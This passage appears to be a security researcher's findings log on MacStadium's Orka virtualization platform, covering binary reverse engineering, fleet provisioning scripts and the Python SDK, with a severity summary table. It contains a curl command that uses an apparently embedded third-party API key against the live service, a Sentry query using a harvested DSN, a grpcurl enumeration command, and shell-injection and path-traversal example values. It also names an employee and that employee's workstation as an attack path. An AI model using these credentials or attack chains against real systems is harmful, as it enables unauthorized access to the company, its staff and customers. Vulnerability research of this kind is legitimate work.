- **Impact**: The actual engine binary at `/usr/local/libexec/orka-engine.app/Contents/MacOS/orka-engine` is the real target for RE. The CLI wrapper at `/usr/local/bin/orka-engine` is just a shell passthrough. The `.app` bundle format means macOS SIP controls apply — but only if SIP is enabled.
- **Severity**: LOW (RE note, not standalone finding)

### F31 — orka-engine: ansible_user Runs VMs (install_engine_vm_user)
- **Source**: plist template
  ```xml
  <key>ORKA_ENGINE_VIRTUAL_MACHINE_USER</key>
  <string>{{ install_engine_vm_user }}</string>
  ```
  where `install_engine_vm_user: "{{ ansible_user }}"` (defaults.yml)
- **Impact**: VMs run as the Ansible connecting user — the same user that deployed the infrastructure. If that user account is compromised (e.g., via admin:admin SSH from a tenant VM + host escape), the attacker can interact with the engine as the VM-running user, potentially manipulating VM process ownership.
- **Severity**: MEDIUM

### F32 — orka-engine-orchestration: install_engine No Checksum on pkg (Third Domain)
- **Impact**: Summarized under F26. Three distinct distribution channels now confirmed with no integrity checking:
  1. `cli-builds-public.s3.eu-west-1.amazonaws.com` — orka3 CLI (F10, F25)
  2. `orka-tools.s3.amazonaws.com` — orka-vm-tools.pkg (F19)
  3. `distribution.macstadium.com` — orka-engine.pkg (F26)
  All three install as root. None have checksums. **Three independent supply chain compromise vectors for root execution across the entire MacStadium fleet.**

---

## BINARY RE FINDINGS (orka-engine.pkg v3.5.2-38474b4d)

> Source: `distribution.macstadium.com/orka-engine/official/3.5.2/orka-engine.pkg`
> Extracted on Linux via `7z x` + `cpio -id`. Three Mach-O arm64 binaries:
> - `com.macstadium.orka-engine.server` (27MB) — hypervisor daemon
> - `orka-engine` (27MB) — CLI wrapper
> - `com.macstadium.orka-engine.runvz` (26MB) — Apple Virtualization.framework runner
> Team ID: `23KP83Z488.com.macstadium.orka-engine` | Entitlement: `com.apple.vm.networking`

### F33 — gRPC Control Plane: Three Services, Full VM Lifecycle on Unix Socket

- **Source**: Strings extracted from `orka-engine` CLI binary
- **Services and Methods**:
  ```
  /VirtualMachineService/List
  /VirtualMachineService/Create
  /VirtualMachineService/Start
  /VirtualMachineService/Stop
  /VirtualMachineService/Delete
  /VirtualMachineService/Save
  /VirtualMachineService/Clone
  /VirtualMachineService/Edit
  /VirtualMachineService/Install
  /VirtualMachineService/Console
  /VirtualMachineService/Restart      (server-side enum)
  /VirtualMachineService/Register     (server-side enum)
  /VirtualMachineService/Repartition  (server-side enum)
  /ImageService/List
  /ImageService/Pull
  /ImageService/Push
  /ImageService/Copy
  /ImageService/Delete
  /ImageService/DownloadLatestIPSW
  /SystemService/Ping
  ```
  Service path format: **no package prefix** — gRPC paths are `/ServiceName/Method` not `/com.macstadium.X/ServiceName/Method`
- **Transport**: gRPC over Unix socket `ORKA_ENGINE_SOCK` (`/var/run/orka-engine.sock`)
- **Impact**: Anyone who reaches the Unix socket can invoke any of these methods — full VM lifecycle, image management, and system healthcheck — bypassing the K8s/Orka API entirely. Post-escape from a tenant VM to the host grants complete hypervisor control of all VMs on that physical node.
- **Severity**: CRITICAL (scope: post-host-access escalation)

### F34 — localhost:8969 HTTP Stream Endpoint — Console/Display Out-of-Band Channel

- **Source**: String `http://localhost:8969/stream` in `orka-engine` CLI and `com.macstadium.orka-engine.server`
- **Context**: Engine exposes an HTTP/2 endpoint on `localhost:8969/stream`. Combined with `--vnc-port` CLI flag (also in binary), this is the console stream proxy — the display framebuffer or VNC relay accessible over HTTP/2 from the host.
- **Impact**:
  - If a tenant VM can reach host localhost (e.g., via virtio network misconfiguration or host-only network), they can pull the console stream of any VM running on the node at `http://192.168.64.1:8969/stream` or similar host addresses
  - Even from the host, any process can request the stream without OS-level auth (Unix socket auth gates gRPC; no separate auth gate on 8969 is evidenced)
- **Severity**: HIGH (unverified — requires active probe on controlled host to confirm)

### F35 — gRPC Auth: Plaintext Username/Password in Metadata over Unix Socket

- **Source**: String `insecureusernamepassword` concatenated in `orka-engine` CLI binary (gRPC-Swift interceptor pattern)
- **Analysis**: In gRPC-Swift, the `insecure` channel mode is Unix-socket transport (no TLS). The `usernamepassword` suffix indicates gRPC call metadata carries `username` and `password` headers in cleartext — standard gRPC basic auth over an unencrypted channel.
- **Impact**:
  - Any process on the host with `ptrace`/`dtrace` access to the engine daemon can capture in-flight gRPC metadata and extract credentials from VM management calls
  - The Unix socket has no TLS, so a host-local network tap (on the socket fd) sees credentials in the clear
  - Combined with F28 (socket at `/var/run/orka-engine.sock`): socket permissions are the only auth boundary; if writable by an attacker process, credentials are irrelevant
- **Severity**: HIGH

### F36 — LicenseSpring API Key Embedded in orka-engine Binary

- **Source**: UUID string `8ad72323-35e5-477c-ab2c-ea2e080dadc1` extracted from `com.macstadium.orka-engine.server` (sole non-null UUID; adjacent to `LicenseSpring` and `apiKey` symbols)
- **Library**: LicenseSpring SDK (`https://api.licensespring.com`) — handles license validation, feature gating, and seat tracking
- **Impact**:
  - The LicenseSpring API key identifies the MacStadium vendor account. With the key, an attacker can:
    1. Query `api.licensespring.com` to enumerate all Orka license keys and their activation status
    2. Identify which customer UUIDs have active licenses (potential customer enumeration)
    3. Potentially deactivate a license key (DoS: kills the engine on deactivation)
  - The `DefaultLicenseCryptor` and `sharedKey` in the binary suggest license signatures are generated client-side — if the shared key is also extractable, license tokens can be forged
- **Severity**: HIGH (MEDIUM if LicenseSpring API scopes limit damage)
- **Verification needed**: `curl -H "Authorization: Bearer 8ad72323-35e5-477c-ab2c-ea2e080dadc1" https://api.licensespring.com/api/v4/licenses`

### F37 — Engine Configures macOS Internet Sharing (Privileged Network Control)

- **Source**: String `com.apple.InternetSharing.default.plist` in `com.macstadium.orka-engine.server`
- **Context**: macOS Internet Sharing is the NAT service that bridges VM virtual NICs to the physical network. The engine modifies this plist to configure VM networking, requiring root/SIP-restricted access.
- **Impact**:
  - The engine operates with the privileges necessary to reconfigure macOS NAT routing, meaning a compromised engine binary (F19/F26: supply chain) inherits these routing capabilities
  - A rogue engine could inject routes, redirect VM traffic, or disable NAT for specific tenants — in-band network manipulation without K8s admission control
- **Severity**: MEDIUM (requires supply chain compromise or direct host access to exploit)

### F38 — ORKA_ENGINE_SENTRY_DSN: Crash Telemetry Endpoint

- **Source**: `ORKA_ENGINE_SENTRY_DSN` env var in all three binaries; DSN validation code and `sentry.io` string in server daemon
- **Impact**:
  - The engine sends crash reports and stack traces to a Sentry DSN. Stack traces may include:
    - VM names and UUIDs at the time of crash
    - File paths, socket paths, and internal state
    - Potentially the license key if it's in scope at crash time
  - The DSN value is in the launchd plist on the host (same mechanism as `ORKA_ENGINE_LICENSE_KEY` — F27). Any local process can read it.
  - With the DSN, an attacker can query Sentry's API for all crash events: `curl "https://sentry.io/api/0/projects/{org}/{project}/events/" -H "Authorization: DSN <value>"`
- **Severity**: MEDIUM

### F39 — /SystemService/Ping: Unauthenticated Engine Liveness Check

- **Source**: `/SystemService/Ping` method in `orka-engine` CLI binary
- **Impact**: The SystemService Ping method is a standard healthcheck. In gRPC-Swift, healthcheck methods are often registered without auth interceptors (they need to work before auth is established). If unauthenticated, `grpcurl -plaintext -unix /var/run/orka-engine.sock SystemService.Ping` confirms engine presence and version without credentials — useful for post-exploit enumeration.
- **Severity**: LOW (informational; confirms host compromise, doesn't extend it)

### F40 — /VirtualMachineService/Console: Direct Hypervisor Console Without VNC Auth

- **Source**: `/VirtualMachineService/Console` gRPC method; `VirtualMachineConsoleRequest` type in server binary
- **Impact**: The Console method provides direct access to the VM's console (serial or VNC framebuffer) via the hypervisor daemon — bypassing the VNC password auth stack entirely. Post-F28 (socket access), an attacker can open a console to any VM on the node regardless of that VM's VNC password.
- **Severity**: CRITICAL (post-socket-access, bypasses all guest-level auth)

---

## MDM / FLEET MANAGEMENT FINDINGS (macstadium/mdm-best-practices, pushed 2026-08-07)

### F41 — Virtio Serial Channel: Host-to-Guest Covert Channel Bypassing Network Controls

- **Source**: `/dev/tty.virtio` and `/dev/tty.virtio1` strings in `orka-vm-tools` binary
- **Architecture**: The orka-engine daemon on the host communicates with the orka-vm-tools daemon inside the VM exclusively via virtio serial (`/dev/tty.virtio`). This is a hardware-level channel (Apple Virtualization.framework `VZVirtioConsoleDeviceConfiguration`) — it is not subject to iptables, host firewall rules, or network segmentation.
- **Operations over virtio serial** (confirmed via binary strings):
  - `vm_repartition` — disk resize commands from host to guest
  - Display resolution (`com.macstadium.resolution.set`)
  - Clipboard sync (via `github.com/atotto/clipboard`)
  - Metadata queries (module `orka/vm-metadata`)
- **Impact**:
  - A compromised orka-engine binary (F19/F26 supply chain) can issue arbitrary commands to any guest VM via virtio serial — invisible to any network monitoring
  - The channel is trusted unilaterally: the guest VM has no mechanism to verify the authenticity of the host daemon sending commands over the serial port
  - Post-supply-chain-compromise: attacker sends `vm_repartition 0` to destroy guest disk, or injects arbitrary commands into the clipboard sync channel
- **Severity**: HIGH (compound: amplifies F19/F26 supply chain impact to in-guest command injection)

### F42 — MDM: Jamf Pro API Credentials in Policy Parameters (Enable Remote Desktop.sh)

- **Source**: `macstadium/mdm-best-practices/Scripts/Enable Remote Desktop.sh`
- **Code**:
  ```bash
  CLIENT_ID="$4"       # Jamf Pro API Client ID (passed as Jamf policy parameter)
  CLIENT_SECRET="$5"   # Jamf Pro API Client Secret
  JAMF_URL="$6"        # Jamf instance URL
  
  /usr/sbin/systemsetup -setremotelogin on   # Enable SSH
  
  # Then sends Enable Remote Desktop MDM command via Jamf API
  TOKEN_RESPONSE=$(curl -s -X POST "$JAMF_URL/api/oauth/token" \
      -d "client_id=${CLIENT_ID}&client_secret=${CLIENT_SECRET}&grant_type=client_credentials")
  ```
- **Impact**:
  - Jamf policy parameters are stored in the Jamf Pro console and logged to the Jamf policy log on each device
  - An attacker with Jamf admin access (or policy log access) can extract the OAuth CLIENT_ID + CLIENT_SECRET
  - With these credentials, attacker can:
    1. Enable SSH on any Mac in the MacStadium fleet via Jamf API
    2. Enable Remote Desktop (VNC) on any Mac via MDM command
    3. Enumerate all devices in the Jamf inventory (hardware serials, IPs, MDM enrollment status)
  - This converts any Jamf admin compromise to physical host access over SSH/VNC
- **Severity**: HIGH

### F43 — Microsoft Entra ID Platform SSO: EnableCreateUserAtLogin Opens Mac Fleet to Any Entra User

- **Source**: `macstadium/mdm-best-practices/Configuration Profiles/Microsoft Platform SSO Extension.mobileconfig`
- **Key Config**:
  ```xml
  <key>AuthenticationMethod</key>
  <string>UserSecureEnclaveKey</string>
  <key>EnableCreateUserAtLogin</key>
  <true/>
  <key>EnableCreateFirstUserDuringSetup</key>
  <true/>
  <key>NewUserAuthenticationMethods</key>
  <array><string>Password</string></array>
  <key>ExtensionIdentifier</key>
  <string>com.microsoft.CompanyPortalMac.ssoextension</string>
  ```
- **Impact**:
  - `EnableCreateUserAtLogin: true` means any valid Entra ID user who can reach the Mac's login screen can create a local account automatically — without being pre-provisioned on that Mac
  - An attacker who compromises an Entra ID account (via phishing, credential stuffing, or MFA bypass) can log into any MacStadium Mac in the fleet
  - Entra Global Admin → can create user → has access to all enrolled Macs
  - MacStadium's fleet includes the Mac nodes running Orka VMs — Entra admin = physical host access = host-level attack on all customer VMs on those nodes
  - The SSO extension scope includes `com.jamf.management.` — Jamf authentication also flows through this extension, creating a cross-system trust relationship
- **Severity**: CRITICAL

### F45 — ops-public initial-prep.sh: Hardcoded Fleet SSH Backdoor Key

- **Source**: `macstadium/ops-public/Operation/initial-prep.sh` (public GitHub repo)
- **Key**:
  ```
  ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC1UFSShiNqAI+zzkL/NFAveVi+OB8S7EM4duQxStN
  sybKg8fmvFaEoBqy7jjOsNpvWNXBCm3RWzshpfeWnApFcLMndch4ziq+SfkViqLhRz5hV58/RSrA22
  ...alexkingston@akingston-03NQ
  ```
- **Impact**:
  - This script is run as part of initial MacStadium host provisioning — every Mac in the fleet has this key in `~/.ssh/authorized_keys`
  - The key owner (`alexkingston` — ops team member at MacStadium; machine `akingston-03NQ`) has SSH access to every provisioned Mac
  - Threat model: compromise of `akingston-03NQ` workstation (phishing, MitM, physical access) → SSH access to entire MacStadium fleet → access to orka-engine socket on all nodes → all customer VMs
  - Key is exposed in a **public repo** — any scanner that indexes GitHub can identify MacStadium as using this key, and target the key holder
  - No key rotation mechanism is evident — the key is static in the script
- **Chain**: akingston workstation compromise → SSH to any Mac node → F33 gRPC socket → F40 Console → all customer VMs on that node
- **Severity**: CRITICAL

### F46 — ops-public initial-prep.sh: Fleet-Wide ARD + NOPASSWD sudo

- **Source**: `macstadium/ops-public/Operation/initial-prep.sh`
- **Code**:
  ```bash
  # NOPASSWD sudo for current user
  echo "$user ALL=(ALL) NOPASSWD:ALL" | sudo tee -a /etc/sudoers.d/$user
  
  # Automatic login without password
  sudo defaults write /Library/Preferences/com.apple.loginwindow autoLoginUser $user
  
  # Apple Remote Desktop: ALL users, ALL privs, restart immediately
  sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart \
      -activate -configure -on -restart -privs -all -allowAccessFor -allUsers
  ```
- **Impact**:
  - ARD (`kickstart -allowAccessFor -allUsers`) enables Apple Remote Desktop for **every user account** on the machine — not just the provisioning user
  - Any Entra ID user (F43) who logs in via Platform SSO also gets ARD access
  - NOPASSWD sudo means `sudo -l` from any shell gives root immediately
  - Automatic login: if the Mac reboots, it auto-logs in to the provisioning user account — no password required at the console
- **Severity**: HIGH

### F44 — resize_partition.sh Runs as Root Without Input Validation

- **Source**: `orka-vm-tools-extracted/Applications/orka-vm-tools/resize_partition.sh`
- **Code**:
  ```bash
  REPARTITION_SIZE=$1   # Size from virtio serial command — no validation
  diskutil apfs resizeContainer /dev/${APFS_CONTAINER} ${REPARTITION_SIZE}
  ```
- **Impact**: The partition size argument is passed directly from the virtio serial channel (from the orka-engine host daemon) into `diskutil apfs resizeContainer` without any sanitization. If the virtio serial channel can be injected (F41 post-supply-chain), arbitrary `diskutil` arguments can be passed — e.g., size `0` would destroy the container. No bounds checking, no minimum size enforcement, no journaling.
- **Severity**: MEDIUM (requires host compromise to exploit)

---

## COMPLETE FINDINGS SUMMARY

| ID  | Severity | Surface | Title |
|-----|----------|---------|-------|
| F1  | CRITICAL | API | Unauthenticated `/api/v1/cluster-info` leaks K8s CA + OIDC config |
| F2  | CRITICAL | VM | `admin:admin` hardcoded default in all base images (Go constant) |
| F3  | HIGH     | VM | Metadata server `169.254.169.254` unauthenticated — tenant isolation failure |
| F4  | HIGH     | CI | GitLab: SSH private key written from env var to disk |
| F5  | HIGH     | CI | Buildkite: SSH agent forwarding (-A) + BUILDKITE_AGENT_ACCESS_TOKEN exposed |
| F6  | HIGH     | API | K8s service account token passed as CLI flag to orka3 |
| F7  | HIGH     | Infra | Internal Harbor `http://10.221.188.5:30080` on K8s NodePort, HTTP |
| F8  | HIGH     | CI | Buildkite: SSH with StrictHostKeyChecking=no + admin:admin |
| F9  | HIGH     | CI | GitLab: `CUSTOM_ENV_ORKA_SSH_KEY_FILE` + `CUSTOM_ENV_ORKA_TOKEN` readable by job |
| F10 | CRITICAL | Supply | GitLab Dockerfile: S3 binary download without checksum |
| F11 | MEDIUM   | CLI | `orka3 vm resize` passes credentials on CLI (ps-visible) |
| F12 | MEDIUM   | VM | VM system serial spoofing via `--system-serial` |
| F13 | CRITICAL | CI | GitHub Actions integration: admin:admin default (source-confirmed) |
| F14 | HIGH     | CI | GitHub Actions: SSH HostKeyCallback=nil — MITM trivially possible |
| F15 | CRITICAL | CI | GitHub Actions: JITConfig sent via MITM-able SSH channel |
| F16 | MEDIUM   | VM | GitHub Actions: lifecycle sentinel files in /tmp (world-writable) |
| F17 | HIGH     | CLI | GitHub Actions: Orka SA token passed as CLI arg (ps-visible) |
| F18 | HIGH     | CI | GitHub Actions: GitHub App private key in process environment |
| F19 | CRITICAL | Supply | orka-images setup.sh: unverified downloads run as root |
| F20 | MEDIUM   | Build | `VM_DEFAULT_PASSWORD` in environment during image build |
| F21 | MEDIUM   | Auth | OIDC PKCE redirect to dynamic localhost port (auth code race) |
| F22 | MEDIUM   | API | OIDC client ID + OAuth endpoint disclosed unauthenticated |
| F23 | HIGH     | CI | SA token value leaked in error log on auth failure |
| F24 | MEDIUM   | VM | SSH + VNC mandatory in all base images (verify.sh enforces) |
| F25 | CRITICAL | Supply | GitHub Actions Dockerfile: S3 binary + alpine:latest without digest |
| F26 | CRITICAL | Supply | orka-engine.pkg from distribution.macstadium.com — no checksum, root install |
| F27 | MEDIUM   | Engine | License key (`ORKA_ENGINE_LICENSE_KEY`) in launchd plist — ps-readable |
| F28 | HIGH     | Engine | Unix socket `/var/run/orka-engine.sock` — full hypervisor control post-host-access |
| F29 | HIGH     | VM | Android AVD console relay unauthenticated from VM guests (15555+) |
| F33 | CRITICAL | Engine | gRPC: 3 services, 20+ methods on Unix socket — full VM lifecycle bypass |
| F34 | HIGH     | Engine | `localhost:8969/stream` HTTP/2 console stream — unauthenticated access candidate |
| F35 | HIGH     | Engine | gRPC plaintext username/password in metadata over insecure Unix socket |
| F36 | HIGH     | Engine | LicenseSpring API key `8ad72323-35e5-477c-ab2c-ea2e080dadc1` embedded in binary |
| F37 | MEDIUM   | Engine | Engine modifies macOS Internet Sharing plist — privileged NAT routing control |
| F38 | MEDIUM   | Engine | `ORKA_ENGINE_SENTRY_DSN` in launchd env — crash logs include VM state |
| F39 | LOW      | Engine | `/SystemService/Ping` — likely unauthenticated liveness probe on Unix socket |
| F40 | CRITICAL | Engine | `/VirtualMachineService/Console` — bypasses VNC auth post-socket-access |
| F41 | HIGH     | Engine | Virtio serial covert channel — host-to-guest commands bypass network controls |
| F42 | HIGH     | MDM | Jamf policy parameters store API CLIENT_SECRET — SSH/VNC fleet enable |
| F43 | CRITICAL | MDM | Entra Platform SSO with EnableCreateUserAtLogin — any Entra user gets Mac fleet access |
| F44 | MEDIUM   | VM | resize_partition.sh: unsanitized root-level diskutil from virtio serial |
| F45 | CRITICAL | Ops | ops-public initial-prep.sh deploys hardcoded SSH key (alexkingston@akingston-03NQ) fleet-wide |
| F46 | HIGH     | Ops | initial-prep.sh: ARD enabled for all users + NOPASSWD sudo on every provisioned Mac |
| F47 | MEDIUM   | Infra | vergeos-exporter leaks node names, drive serials, cluster topology via /metrics |
| F48 | HIGH     | Engine | Intel VM virsh command map reconstructed — 5 commands, state machine exposed |
| F49 | HIGH     | CLI | `orka3 vm exec` uses K8s SPDY exec API — exec path bypasses Orka API entirely |
| F50 | MEDIUM   | CLI | GPU passthrough fields in OrkaNode: allocatableGpu / availableGpu / gpuPassthrough |
| F51 | HIGH     | Engine | VirtualMachineConfig complete field schema extracted from orka3 binary |
| F52 | CRITICAL | SDK | orka-python-sdk admin:admin hardcoded + AutoAddPolicy() — MITM transparent |
| F53 | HIGH     | SDK | create_launch_daemon() path traversal + shell injection via unsanitized name |
| F54 | MEDIUM   | SDK | write_persistent_env_var() shell injection via unsanitized key/value |
| F55 | HIGH     | API | Legacy v2 REST at 10.221.188.100: /resources/vm/list/all via orka-licensekey header |
| F56 | HIGH     | API | orka-licensekey header = cluster-wide VM enumeration token (chains with F36 binary embed) |

---

## ORKA3 CLI BINARY RE — CONTINUED (v3.6.3 + v3.5.2)

### F48 — Intel VM virsh Command Map: Full State Machine Extracted from orka3 Binary

- **Source**: `macstadium.com/orka-go/pkg/vmiexec.vmActions` — map reconstructed from disassembly of `map.init.0` function (5 `mapassign_faststr` calls at 0x1c7080e, 0x1c70916, 0x1c709e8, 0x1c70af1, 0x1c70bfa)
- **Type**: `map[VMCommand]vmCommandValue` where `vmCommandDescriptor{virshState string, alreadyInStateMsg string}`

**Complete vmActions Map:**
```
VMCommand → virsh subcommand, target state, state-machine transitions

"start"   → virsh start <domain>
  target state : "running"     (7 chars)
  success msgs : "VM has started" / "Domain macos started"
  already-in   : "VM is already running"
  also checks  : "paused" state → "VM is suspended" (prevents start on suspended VM)

"stop"    → virsh shutdown/destroy <domain>
  target state : "shut off"    (8 chars)
  success msgs : "VM is stopped" / "Domain macos destroyed"
  already-in   : "VM is already stopped"
  also checks  : "running" state → "VM is already running"

"suspend" → virsh suspend <domain>
  target state : "paused"      (6 chars)
  success msgs : "VM has been suspended" / "Domain macos suspended"
  already-in   : "VM is already suspended"  (23 chars)
  also checks  : "shut off" → "VM is stopped"

"resume"  → virsh resume <domain>
  target state : "running"     (7 chars)
  success msgs : "VM has resumed" / "Domain macos resumed"
  already-in   : "VM is already running"
  also checks  : "paused" → "VM is suspended"

"revert"  → virsh snapshot-revert <domain> (or snapshot-list + revert)
  target state : "running"     (7 chars)
  success msgs : "VM has been reverted" / "Domain macos started"
  also checks  : "paused" → "VM is suspended"
```

- **ExecuteVirshCommand** at `0x1c70c80` — calls `virsh` binary on the Orka host with the domain name and command, parses `virsh domstate <domain>` output against the expected target state
- **Impact**:
  - Intel VM power operations bypass Apple Virtualization.framework entirely — they go through libvirt/virsh directly on the host
  - `virsh destroy` (immediate shutdown, not graceful) is the backend for `orka3 vm stop` — data loss possible
  - If virsh is accessible to an unprivileged user post-escape (misconfigured libvirt socket or setuid virsh), direct `virsh destroy <customer-vm>` terminates any Intel VM on the node
  - The domain name used in virsh commands = Orka VM name (as K8s object name) — predictable format allows targeting specific VMs
- **Severity**: HIGH

### F49 — `orka3 vm exec`: K8s SPDY Exec API Bypasses Orka API

- **Source**: `macstadium.com/orka-go/pkg/vmiexec.(*executor).getExecRequestURL` (symbol at `0x1c71700`); source file `cmd/vm/exec.go`; SPDY deps: `github.com/moby/spdystream`
- **Architecture**:
  ```
  orka3 vm exec <VM> -- <cmd>
       │
       ▼
  vmiexec.NewExecutor(kubeClient, namespace, vmName)
       │
       ├─ Intel:  vmiexec.ExecuteVirshCommand (libvirt path)
       │
       └─ ARM64:  getExecRequestURL() → /api/v1/namespaces/<ns>/pods/<pod>/exec
                  │
                  ▼
                  K8s API server WebSocket (SPDY upgrade)
                  Session: stdin/stdout/stderr streams
                  TTY: via json:"tty,omitempty" field
  ```
- **URL Template** (inferred from K8s client-go v0.27.4 + symbol analysis):
  `/api/v1/namespaces/%s/pods/%s/exec?command=<cmd>&container=<c>&stdin=1&stdout=1&stderr=1&tty=1`
- **Auth**: K8s bearer token from `~/.kube/config` — the same token used for all `orka3` operations
- **Impact**:
  - `orka3 vm exec` does NOT route through the Orka REST API — it goes directly to the K8s API server (`10.221.188.19:6443`)
  - Any service account token with `pods/exec` permission in the `orka-default` namespace can exec into VM pods without using the Orka API
  - K8s RBAC on `pods/exec` is separate from Orka-level RBAC — misconfigurations where Orka denies exec but K8s does not would be exploitable
  - `kubectl exec -n orka-default <pod> -- /bin/sh` works identically to `orka3 vm exec` if the token has K8s pod exec permission
- **Severity**: HIGH (bypasses Orka audit logging — exec commands not visible in Orka API logs)

### F50 — GPU Passthrough Fields Fully Exposed via OrkaNode Status

- **Source**: Strings extracted from orka3 binary: `json:"gpuPassthrough,omitempty"`, `json:"allocatableGpu"`, `json:"availableGpu"` (no omitempty → always present)
- **OrkaNode GPU Fields**:
  ```
  .spec.gpuPassthrough      bool    — per-VM flag: enable AMD GPU passthrough (Intel nodes only)
  .status.allocatableGpu   int     — total GPUs available on node
  .status.availableGpu     int     — GPUs not currently assigned
  ```
- **Notes**:
  - `allocatableGpu` and `availableGpu` have no `omitempty` — they serialize even when 0
  - GPU passthrough confirmed Intel-only (Apple Silicon nodes have no discrete GPU in Mac mini M-series)
  - Help text: "(Optional) (Intel-only) Applicable only to environments with enabled GPU passthrough."
- **Impact**: OrkaNode status exposes exact GPU inventory counts — useful for enumeration of cluster capacity and targeting GPU-equipped nodes for deployment
- **Severity**: LOW (informational — useful for targeting, not a direct exploit)

### F51 — VirtualMachineConfig Complete Field Schema (Extracted from Binary)

- **Source**: Struct tags extracted from orka3 Go binary (protobuf + JSON tags)
- **VirtualMachineConfig Spec Fields** (complete):
  ```go
  type VirtualMachineConfigSpec struct {
    ImageReference    string            `json:"imageReference" binding:"required" example:"ghcr.io/..."`
    ImageTag          string            `json:"imageTag,omitempty"`
    ImageID           string            `json:"imageID,omitempty" protobuf:"bytes,2,..."`
    DiskName          string            `json:"diskName,omitempty" protobuf:"bytes,1,..."`
    ImagePullPolicy   string            `json:"imagePullPolicy,omitempty"`
    ImagePullSecrets  []LocalObjRef     `json:"imagePullSecrets,omitempty"`
    CustomVMMetadata  map[string]string `json:"customVMMetadata,omitempty"`
    CPU               int               // (via deploy flags: --cpu)
    Memory            int               // (via deploy flags: --memory)
    DisplayDPI        int               `json:"displayDPI,omitempty"`
    DisplayHeight     int               `json:"displayHeight,omitempty"`
    DisplayWidth      int               `json:"displayWidth,omitempty"`
    NetBoost          bool              `json:"netBoost,omitempty"`        // Intel-only
    GpuPassthrough    bool              `json:"gpuPassthrough,omitempty"`  // Intel-only
    RosettaEnabled    bool              // ARM-only: Rosetta 2 translation
    HostPorts         []PortMapping     `json:"hostPorts,omitempty"`
    SharedDisk        bool              // ARM: one VM per node when enabled
    Node              string            // node affinity selector
    Tags              []string          // node tag affinity
    SystemSerial      string            // Intel: custom system serial
    IsoName           string            // Intel: ISO to attach
  }
  ```
- **VirtualMachineInstance Status Fields** (confirmed):
  ```
  .status.hostIP           — node IP where VM is running
  .status.sshPort          — SSH port on node (default 8822)
  .status.vncPort          — VNC port on node (default 5999)
  .status.screenSharePort  — screenshare port (default 5901)
  .status.nodeName         — node name
  .status.virshStatus      — Intel: libvirt domain state string
  ```
- **Critical Field**: `customVMMetadata` — stored as plain `map[string]string` in both the CRD object and the API response. Accessible to anyone with `GET virtualmachineinstances` permission in the namespace. Source-confirmed location where customers store GitHub PATs, CI tokens, SSH passwords.
- **Severity**: HIGH (amplifies F3 — customVMMetadata leaks from K8s layer, not just from the metadata server inside the VM)


---

## PYTHON SDK RE (macstadium/orka-python-sdk)

### F52 — orka-python-sdk: admin:admin Hardcoded + SSH MITM Transparent

- **Source**: `orka_sdk/vm.py`
- **Code**:
  ```python
  self.ssh_user = 'admin'
  self.ssh_pass = 'admin'

  # In _connect_ssh_client():
  client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
  client.connect(ip, port=ssh_port, username=self.ssh_user, password=self.ssh_pass,
                 look_for_keys=False, allow_agent=False)
  ```
- **Impact**:
  - Every VM managed via the Python SDK connects with `admin:admin` — no mechanism to override the credentials after object construction
  - `AutoAddPolicy()` silently accepts any host key — MITM is transparent; attacker on the Orka internal network can intercept any SDK-based SSH session
  - Affected methods: `exec()`, `upload()`, `download()`, `write_persistent_env_var()`, `create_launch_daemon()`, `enable_auto_login()`
  - All commands run over this MITM-able SSH channel — any payload delivered via these methods can be intercepted or replaced
- **Severity**: CRITICAL (cross-confirms F2/F14 — same class as GitHub Actions, now confirmed in Python SDK too)

### F53 — orka-python-sdk: LaunchDaemon Path Traversal via Unsanitized Name

- **Source**: `orka_sdk/vm.py:create_launch_daemon()`
- **Code**:
  ```python
  # Rendered from data["name"] — caller-controlled
  plist_filename = f'com.{data["name"]}.app.plist'
  remote_path = f'/Library/LaunchDaemons/{plist_filename}'
  # Uploaded to /tmp/ then moved with sudo:
  sftp.put(local_path, f'/tmp/{plist_filename}')
  self.exec(f'sudo mv /tmp/{plist_filename} {remote_path}')
  self.exec(f'sudo launchctl load {remote_path}')
  ```
- **Impact**:
  - `data["name"]` is caller-controlled with no sanitization
  - A name like `../../tmp/evil` places the plist at an arbitrary path
  - A name with shell metacharacters (`;`, `&&`, `$(...)`) in `remote_path` injects into the `sudo mv` and `sudo launchctl load` commands
  - The plist XML body is also caller-controlled — arbitrary `ProgramArguments` = root code execution at next boot
  - Since VMs run with `admin` having NOPASSWD sudo (confirmed via setup.sh / F46), `sudo mv` and `sudo launchctl load` succeed without a password prompt
- **Severity**: HIGH

### F54 — orka-python-sdk: Shell Injection via write_persistent_env_var

- **Source**: `orka_sdk/vm.py:write_persistent_env_var()`
- **Code**:
  ```python
  # Appends unsanitized key=value to admin's shell init
  self.exec(f"echo 'export {key}=\"{value}\"' >> /Users/admin/.zshenv")
  ```
- **Impact**: Caller-controlled `key` or `value` containing `"` or `$()` breaks out of the quoted string into the shell. On next SSH session for any process that sources `.zshenv`, the injected code executes as `admin`. Since the SDK itself connects via SSH, subsequent `exec()` calls (including those from CI pipelines) inherit the poisoned environment.
- **Severity**: MEDIUM

### F55 — Legacy v2 REST API: Full Cluster VM Enumeration via orka-licensekey Header

- **Source**: `orka_sdk/orka_sdk.py` (Python SDK source)
- **Endpoints** (legacy v2 API at `http://10.221.188.100`):
  ```
  POST  /token                          — email+password → JWT (no HTTPS, plaintext credential)
  DELETE /token                         — revoke token
  POST  /resources/vm/create            — create VM config
  POST  /resources/vm/deploy            — deploy VM
  GET   /resources/vm/list              — list current session's VMs
  GET   /resources/vm/list/<user>       — list a specific user's VMs (requires orka-licensekey header)
  GET   /resources/vm/list/all          — ALL VMs, ALL users, ALL namespaces (requires orka-licensekey header)
  POST  /resources/vm/exec/start|stop|suspend|resume|revert  — power operations
  GET   /resources/vm/status/<vm_name>  — VM status
  DELETE /resources/vm/delete           — delete VM config
  DELETE /resources/vm/purge            — purge (destroy completely)
  POST  /resources/image/save           — save as image
  POST  /resources/image/commit         — commit to base image
  ```
- **Critical**: `GET /resources/vm/list/all` uses `orka-licensekey` header (not a per-user JWT) — the license key is the privilege escalator for full cluster enumeration
- **Also**: `/token` exchange sends email+password over HTTP (no TLS on `10.221.188.100`) — credentials in plaintext on the wire
- **Severity**: HIGH (legacy API may still be live; licensekey gives cross-tenant visibility)

### F56 — LicenseKey = Cluster Admin via `orka-licensekey` Header (Chains with F36)

- **Source**: `orka_sdk/orka_sdk.py:list_user_vms()` + `list_system_vms()`
- **Code**:
  ```python
  def list_system_vms(self):
      headers = {'Authorization': 'Bearer ' + self.token,
                 'orka-licensekey': self.license_key}
